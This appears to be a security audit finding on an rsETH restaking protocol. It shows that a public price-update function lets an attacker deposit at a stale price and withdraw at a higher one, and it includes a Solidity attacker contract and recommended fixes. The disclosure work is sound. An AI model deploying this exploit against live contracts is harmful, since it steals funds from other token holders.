### Title
Attacker Can Exploit Stale `rsETHPrice` by Calling Public `updateRSETHPrice()` Between Deposit and Withdrawal in the Same Transaction - (`contracts/LRTOracle.sol`, `contracts/LRTDepositPool.sol`, `contracts/LRTWithdrawalManager.sol`)

---

### Summary

`LRTOracle.updateRSETHPrice()` is a permissionless public function. The stored `rsETHPrice` is used both for minting rsETH on deposit and for computing the `expectedAssetAmount` on withdrawal. An attacker can, in a single atomic transaction, deposit at a stale (lower) price, call `updateRSETHPrice()` to push the stored price to its true higher value, and then initiate a withdrawal (or call `instantWithdrawal()`) at the newly updated higher price — extracting value from other rsETH holders.

---

### Finding Description

`LRTOracle.updateRSETHPrice()` carries no access control beyond `whenNotPaused`: [1](#0-0) 

It writes the new price to the storage variable `rsETHPrice`: [2](#0-1) 

`LRTWithdrawalManager.initiateWithdrawal()` reads `lrtOracle.rsETHPrice()` at the moment of the call to lock in `expectedAssetAmount`: [3](#0-2) 

`getExpectedAssetAmount()` computes the payout directly from the stored price: [4](#0-3) 

`instantWithdrawal()` also reads the same stored price via `getExpectedAssetAmount()` and immediately redeems assets: [5](#0-4) 

The payout cap at completion time is `min(expectedAssetAmount, currentReturn)`: [6](#0-5) 

Because `expectedAssetAmount` is locked at the time of `initiateWithdrawal()`, if the attacker forces the price upward between deposit and withdrawal initiation, the locked-in `expectedAssetAmount` reflects the higher price, and the attacker receives more assets than they deposited.

**Attack sequence (single atomic transaction via a smart contract):**

1. `rsETHPrice` is stale — lower than the true value because staking rewards have accrued since the last update.
2. Attacker calls `LRTDepositPool.depositAsset(asset, X, ...)` — rsETH minted at the stale lower price, so the attacker receives more rsETH than fair value.
3. Attacker calls `LRTOracle.updateRSETHPrice()` — stored price jumps to the true higher value.
4. Attacker calls `LRTWithdrawalManager.initiateWithdrawal(asset, rsETHAmount, ...)` — `expectedAssetAmount` is now computed at the higher price and locked in.
5. After `withdrawalDelayBlocks`, attacker calls `completeWithdrawal()` and receives `expectedAssetAmount` — more than the original deposit.

If `isInstantWithdrawalEnabled[asset]` is `true`, steps 4–5 collapse into a single `instantWithdrawal()` call, making the entire attack atomic with no delay.

---

### Impact Explanation

The attacker recovers more underlying assets than they deposited. The surplus comes from diluting existing rsETH holders: the deposit at the stale lower price inflates rsETH supply relative to backing assets, and the withdrawal at the updated higher price extracts value that belongs to other holders. This is **direct theft of user funds** (Critical).

---

### Likelihood Explanation

`rsETHPrice` is not updated automatically; it requires an explicit call to `updateRSETHPrice()`. Staking rewards accrue continuously, so the stored price is routinely stale between updates. Any unprivileged address can trigger the update. The attacker only needs to monitor the gap between the stored price and the true price (computable off-chain from public on-chain data) and execute when the gap exceeds the deposit/withdrawal fee cost. No special privileges are required. Likelihood is **Medium** (requires a stale price window, which is a normal operating condition).

---

### Recommendation

1. **Remove public access to `updateRSETHPrice()`** or restrict it to a trusted keeper/manager role, so the price cannot be updated on-demand by an attacker mid-transaction.
2. **Alternatively**, snapshot the rsETH price at the start of each user transaction and use that snapshot for both the deposit and any same-block withdrawal initiation, preventing intra-transaction price manipulation.
3. **For `instantWithdrawal()`**, consider using the price at the time of the original withdrawal request rather than the live price at execution time, consistent with how `expectedAssetAmount` is already locked for the delayed path.

---

### Proof of Concept

```solidity
// Attacker contract
contract Exploit {
    ILRTDepositPool depositPool;
    ILRTOracle oracle;
    ILRTWithdrawalManager withdrawalManager;
    IERC20 asset;
    IERC20 rsETH;

    function attack(uint256 depositAmount) external {
        // Step 1: Deposit at stale (lower) rsETHPrice
        asset.approve(address(depositPool), depositAmount);
        depositPool.depositAsset(address(asset), depositAmount, 0, "");

        // Step 2: Force price update — rsETHPrice now reflects accrued rewards
        oracle.updateRSETHPrice();

        // Step 3: Initiate withdrawal at the new higher price
        uint256 rsETHBalance = rsETH.balanceOf(address(this));
        rsETH.approve(address(withdrawalManager), rsETHBalance);
        withdrawalManager.initiateWithdrawal(address(asset), rsETHBalance, "");

        // After withdrawalDelayBlocks: call completeWithdrawal() to collect
        // more assets than originally deposited.
    }
}
```

The `expectedAssetAmount` locked in step 3 equals `rsETHBalance * newHigherPrice / assetPrice`, which exceeds `depositAmount` because `rsETHBalance` was inflated by the stale-price deposit and `newHigherPrice > stalePrice`.

### Citations

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L313-313)
```text
        rsETHPrice = newRsETHPrice;
```

**File:** contracts/LRTWithdrawalManager.sol (L168-168)
```text
        uint256 expectedAssetAmount = getExpectedAssetAmount(asset, rsETHUnstaked);
```

**File:** contracts/LRTWithdrawalManager.sol (L228-228)
```text
        uint256 assetAmountUnlocked = getExpectedAssetAmount(asset, rsETHUnstaked);
```

**File:** contracts/LRTWithdrawalManager.sol (L590-593)
```text
        ILRTOracle lrtOracle = ILRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE));

        // calculate underlying asset amount to receive based on rsETH amount and asset exchange rate
        underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
```

**File:** contracts/LRTWithdrawalManager.sol (L833-834)
```text
        uint256 currentReturn = (request.rsETHUnstaked * rsETHPrice) / assetPrice;
        return (request.expectedAssetAmount < currentReturn) ? request.expectedAssetAmount : currentReturn;
```
